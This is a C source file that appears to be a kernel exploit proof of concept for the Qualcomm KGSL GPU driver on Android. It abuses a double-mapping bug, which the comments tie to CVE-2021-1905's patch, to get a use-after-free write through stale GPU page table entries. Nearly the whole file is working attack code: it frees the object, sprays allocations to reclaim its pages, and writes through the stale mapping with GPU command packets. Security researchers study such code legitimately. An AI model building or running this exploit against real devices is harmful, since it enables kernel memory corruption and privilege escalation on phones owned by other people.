/* kgsl-svmstale.c — turn the deterministic SVM double-region bug into a
 * stale-PTE UAF write primitive.
 *
 *  A. alloc E (SVM 2 pages); mmap#1 assigns G1 and maps E; mremap-shrink resets
 *     the single shared memdesc->useraddr; mmap#2 assigns G2 and maps E at G2,
 *     leaving G1 registered/mapped but untracked (CVE-2021-1905 patch#2 bug).
 *  B. confirm the CP can MEM_WRITE G1 before teardown.
 *  C. free E (drop user ref via GPUOBJ_FREE) + munmap both vmas -> destroy ->
 *     pages freed, kgsl_mmu_put_gpuaddr(G2) only -> G1 stale.
 *  D. spray fresh 2-page GPU objects F to reclaim E's pages.
 *  E. CP_MEM_WRITE(G1, MAGIC) then a marker liveness write; scan F for MAGIC.
 *
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL

struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_gpuobj_free  { uint64_t flags, priv; unsigned int id, type, len; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp;
};
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_FREE   _IOW (KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)

#define KGSL_CONTEXT_PREAMBLE      0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d

static int fd=-1;
static uint32_t *g_cmd; static uint32_t *g_mark;
static uint64_t g_cgpu, g_mgpu; static unsigned g_cid;
static unsigned g_ctx;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }

static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){
    cnt&=0x3fff; op&=0x7f;
    return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23);
}
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

/* submit `ndw` dwords from g_cmd as one IB; marker buffer always in memlist */
static int submit(int ndw,const char *label){
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=g_cgpu; cob.size=(uint64_t)ndw*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=g_cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=g_cid;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=g_ctx;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    errno=0; int r=ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    printf("    submit[%s] rc=%d errno=%d mark=0x%08x ts=%u\n",label,r,errno,
           g_mark[0],gc.timestamp);
    return r;
}

static int g_alloc(uint64_t sz,unsigned *id){
    struct kgsl_gpuobj_alloc a; memset(&a,0,sizeof a); a.size=sz; a.flags=USE_CPU_MAP; a.va_len=sz;
    errno=0; int r=ioctl(fd,IOCTL_GPUOBJ_ALLOC,&a); if(id)*id=a.id; return r;
}
static int g_info(unsigned id,struct kgsl_gpuobj_info *o){
    memset(o,0,sizeof *o); o->id=id; errno=0; return ioctl(fd,IOCTL_GPUOBJ_INFO,o);
}
static int g_free(unsigned id){ struct kgsl_gpuobj_free f; memset(&f,0,sizeof f); f.id=id; errno=0; return ioctl(fd,IOCTL_GPUOBJ_FREE,&f); }

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(90);
    printf("== kgsl SVM stale-PTE UAF probe v2 (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    /* cmd + marker (non-SVM, proven CP path) */
    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca)<0){ printf("[-] alloc cmd: %s\n",strerror(errno)); return 1; }
    g_cid=ca.id; g_cgpu=ca.gpuaddr;
    g_cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)g_cid<<12);
    if(g_cmd==MAP_FAILED){ printf("[-] mmap cmd: %s\n",strerror(errno)); return 1; }
    memset(g_cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma)<0){ printf("[-] alloc marker: %s\n",strerror(errno)); return 1; }
    g_mgpu=ma.gpuaddr;
    g_mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    if(g_mark==MAP_FAILED){ printf("[-] mmap marker: %s\n",strerror(errno)); return 1; }
    g_mark[0]=0;
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    if(ioctl(fd,IOCTL_CTXT_CREATE,&cc)<0){ printf("[-] ctxt: %s\n",strerror(errno)); return 1; }
    g_ctx=cc.drawctxt_id;
    printf("[0] cmd id=%u gpu=0x%llx | marker gpu=0x%llx | ctx=%u\n",g_cid,g_cgpu,g_mgpu,g_ctx);

    /* ---- A. double-region on E ---- */
    unsigned eid=0;
    if(g_alloc(0x2000,&eid)<0){ printf("[-] alloc E: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info ei;
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)eid<<12);
    if(v1==MAP_FAILED){ printf("[-] mmap1: %s\n",strerror(errno)); return 1; }
    g_info(eid,&ei); unsigned long long G1=ei.gpuaddr; memset(v1,0x11,0x2000);
    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    g_info(eid,&ei);
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)eid<<12);
    g_info(eid,&ei); unsigned long long G2=ei.gpuaddr;
    printf("[1] E id=%u G1=0x%llx G2=0x%llx v1=%p v2=%p %s\n",eid,G1,G2,v1,v2,
           (G1&&G2&&G1!=G2)?"DOUBLE-REGION OK":"(unexpected)");

    /* ---- B. confirm CP can write G1 before teardown ---- */
    memset(g_cmd,0,0x100);
    { uint32_t *p=g_cmd; *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,G1); *p++=0xBEEF0001u;
      *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,g_mgpu); *p++=0x11112222u;
      g_mark[0]=0; submit((int)(p-g_cmd),"prefree"); }
    usleep(250000);
    printf("[1b] pre-free CP write G1: v1[0]=0x%08x v2[0]=0x%08x (BEEF0001 => G1 mapped)\n",
           ((uint32_t*)v1)[0], ((uint32_t*)v2)[0]);

    /* ---- C. destroy E: user ref + vma refs ---- */
    g_free(eid);
    if(v2!=MAP_FAILED) munmap(v2,0x2000);
    munmap(v1,0x1000);
    printf("[2] E freed + vmas unmapped -> G1 should be stale\n");

    /* ---- D. spray fresh 2-page objects to reclaim E's pages ---- */
    enum { N=96 }; static void *fmap[N]; static unsigned fids[N]; int got=0;
    for(int i=0;i<N;i++){
        unsigned id=0;
        if(g_alloc(0x2000,&id)<0) break;
        void *p=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
        if(p==MAP_FAILED){ g_free(id); break; }
        memset(p,0,0x2000); fmap[i]=p; fids[i]=id; got++;
    }
    printf("[3] sprayed %d objects\n",got);

    /* ---- E. CP write stale G1, then marker liveness ---- */
    memset(g_cmd,0,0x100);
    const uint32_t MAGIC=0xC0FFEE01u;
    { uint32_t *p=g_cmd; *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,G1); *p++=MAGIC;
      *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,g_mgpu); *p++=0x5A5A5A5Au;
      g_mark[0]=0; submit((int)(p-g_cmd),"staleG1"); }
    usleep(300000);
    printf("[4] after stale write: mark=0x%08x %s\n",g_mark[0],
           g_mark[0]==0x5A5A5A5Au?"(CP survived G1 → G1 mapped)":"(CP faulted on G1 → G1 unmapped)");

    int hit=-1;
    for(int i=0;i<got && hit<0;i++){
        uint32_t *fp=fmap[i];
        for(int j=0;j<0x2000/4;j++) if(fp[j]==MAGIC){ hit=i; printf("[5] *** MAGIC in F[%d] off 0x%x ***\n",i,j*4); break; }
    }
    if(hit<0) printf("[5] magic not found in sprayed objects\n");

    if(g_ctx){ struct kgsl_drawctxt_destroy x={g_ctx}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n");
    return 0;
}
